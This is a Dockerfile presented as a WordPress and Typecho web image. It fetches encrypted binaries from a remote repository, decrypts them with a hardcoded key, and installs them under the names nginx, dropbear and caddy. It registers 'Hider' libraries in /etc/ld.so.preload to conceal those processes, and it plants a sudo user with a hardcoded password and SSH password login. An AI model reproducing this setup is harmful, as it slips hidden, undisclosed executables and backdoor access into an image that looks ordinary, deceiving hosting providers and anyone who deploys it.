FROM ubuntu
ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt install -y curl git fish nano vim wget tar gzip openssl unzip bash php php-cli php-fpm php-zip php-mysql php-curl php-gd php-mbstring php-common php-xml php-xmlrpc openssh-server sudo
#RUN apt install nodejs npm
RUN useradd -r -m -s /usr/bin/fish shelby && echo 'shelby ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && adduser shelby sudo && echo 'passwordAuthentication yes' >> /etc/ssh/sshd_config && echo "shelby:9FOD3EoQ"|chpasswd

# 添加 Freenom Bot 配置文件和依賴
#ADD env /env
RUN apt install -y cron

ADD auto-start /auto-start
RUN chmod +x /auto-start

#如需自行追加啓動命令，請在 auto-command 文件中列出，並取消下方指令的注釋，默認以 root 權限運行。
#ADD auto-command /auto-command

# 如果切换到 O-Version，则应删除如下四条的注释:
#ADD GHOSTID /GHOSTID
#ADD LINKID /LINKID
#RUN chmod +x /GHOSTID
#RUN chmod +x /LINKID

RUN git clone https://snowflare-lyv-development@bitbucket.org/snowflare-lyv-development/wordpressie-pkg-amd64.git
# 切换到 Gitlab 源
#RUN git clone https://gitlab.com/Snowflare-LYV-development/Wordpressie-Pkg-amd64.git

RUN dd if=wordpressie-pkg-amd64/Bin/nginx.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv nginx /usr/bin/nginx && chmod +x /usr/bin/nginx

RUN dd if=wordpressie-pkg-amd64/Bin/dropbear.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv dropbear /usr/bin/dropbear && chmod +x /usr/bin/dropbear

RUN dd if=wordpressie-pkg-amd64/Bin/caddy.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv caddy /usr/bin/caddy && chmod +x /usr/bin/caddy

RUN wget https://cn.wordpress.org/latest-zh_CN.zip && unzip latest-zh_CN.zip && mv wordpress /Bb-website
RUN wget https://github.com/typecho/typecho/releases/latest/download/typecho.zip && unzip -d /Bb-website/typeco typecho.zip
RUN wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php && mv adminer-4.8.1.php /Bb-website/datacenter.php
RUN chmod 0777 -R /Bb-website && chown -R www-data:www-data /Bb-website && chmod 0777 -R /Bb-website/* && chown -R www-data:www-data /Bb-website/*

RUN mv wordpressie-pkg-amd64/Hider /Hider

# 如果是 O-Version ，则下方这一条应注释掉：
RUN mv wordpressie-pkg-amd64/Config/Caddyfile-Paas /Caddyfile

# 如果是 O-Version，则应该删除下面这条的注释:
#RUN mv wordpressie-pkg-amd64/Config/Caddyfile-Paas-o-version /Caddyfile
RUN chmod 0777 /Caddyfile

RUN echo /Hider/nginx.so >> /etc/ld.so.preload
RUN echo /Hider/dropbear.so >> /etc/ld.so.preload
RUN echo /Hider/auto-start.so >> /etc/ld.so.preload

RUN bash wordpressie-pkg-amd64/Bin/auto-check

RUN chmod 0777 -R /Bb-website && chown -R www-data:www-data /Bb-website

#安裝 Freenom Bot
#RUN git clone https://github.com/Ghostwalker-Repo-jNr-22993-82/freenom.git
#RUN chmod 0777 -R /freenom && cp /env /freenom/.env
#RUN ( crontab -l; echo "30 07 * * * cd /freenom && php run > freenom_crontab.log 2>&1" ) | crontab && /etc/init.d/cron start

RUN rm -rf wordpressie-pkg-amd64

USER root
CMD ./auto-start
